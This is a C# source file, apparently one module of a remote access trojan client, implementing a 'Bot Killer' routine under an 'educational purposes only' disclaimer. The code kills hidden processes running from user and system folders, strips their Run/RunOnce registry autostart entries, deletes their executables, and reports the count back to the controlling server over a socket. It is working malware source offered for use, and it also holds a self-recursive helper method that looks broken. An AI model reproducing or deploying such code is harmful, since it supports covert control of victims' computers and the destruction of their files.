using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Client.MessagePack;
using Client.Sockets;

//       │ Author     : NYAN CAT
//       │ Name       : Bot Killer v0.2
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.

namespace Client.Handle_Packet
{
   public class HandleBotKiller
    {
        int count = 0;
        public void RunBotKiller()
        {

            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    string pName = p.MainModule.FileName;
                    if (Inspection(pName))
                        if (!IsWindowVisible(p.MainWindowHandle))
                        {
                            p.Kill();
                            RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\Run", pName);
                            RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", pName);
                            System.Threading.Thread.Sleep(100);
                            File.Delete(pName);
                            count++;
                        }
                }
                catch { }
            }
            if (count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "BotKiller";
                msgpack.ForcePathObject("Count").AsString = count.ToString();
                ClientSocket.Send(msgpack.Encode2Bytes());
            }
        }

        private bool Inspection(string payload)
        {
            if (payload == Process.GetCurrentProcess().MainModule.FileName) return false;
            if (payload.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))) return true;
            if (payload.Contains(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))) return true;
            if (payload.Contains("wscript.exe")) return true;
            if (payload.Contains(RuntimeEnvironment.GetRuntimeDirectory())) return true;
            return false;
        }

        private bool IsWindowVisible(string lHandle)
        {
            return IsWindowVisible(lHandle);
        }

        private void RegistryDelete(string regPath, string payload)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
            {
                if (key != null)
                    foreach (string ValueOfName in key.GetValueNames())
                    {
                        if (key.GetValue(ValueOfName).ToString().Equals(payload))
                            key.DeleteValue(ValueOfName);
                    }
            }
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);
    }
}
